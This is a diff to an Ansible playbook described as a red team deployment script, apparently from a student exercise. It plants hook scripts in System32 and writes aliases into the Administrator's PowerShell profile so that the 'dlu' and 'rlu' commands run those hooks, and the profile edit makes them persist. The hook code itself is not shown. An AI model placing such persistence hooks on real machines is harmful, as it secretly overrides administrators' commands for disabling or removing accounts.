@@ -1,11 +1,13 @@
 # Zach Riback
 # zrr4832@rit.edu
 # 4/2/2024
+# Deployment script for this red team tool
 ---
-- name: Your first playbook
+- name: Deploy red team tool
   hosts: all
   tasks: 
-
+  
+  # deploy the two scripts to replace dlu and rlu commands in Windows
   - name: Deploy Disable-LocalUser script
     ansible.windows.win_copy:
       src: ./Disable-LocalUser-Hook.ps1
@@ -14,6 +16,8 @@
     ansible.windows.win_copy:
       src: ./Remove-LocalUser-Hook.ps1
       dest: C:\Windows\System32\Remove-LocalUser-Hook.ps1
+  # run this powershell script to put the alias creation commands in each given user's powershell profile
+  # this means whenever the user starts up powershell the aliases will be back in place
   - name: Set up alias hooks
     ansible.windows.win_powershell:
       script: | 
@@ -33,6 +37,7 @@
         echo "New-Alias -Name rlu -Value Remove-LocalUser-Hook.ps1 -ErrorAction Silent" | Out-File -Append -FilePath $Path
       parameters:
         Path: C:\Users\{{ item }}\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+    # the users to apply this change to
     loop:
       - ansible
       - Administrator
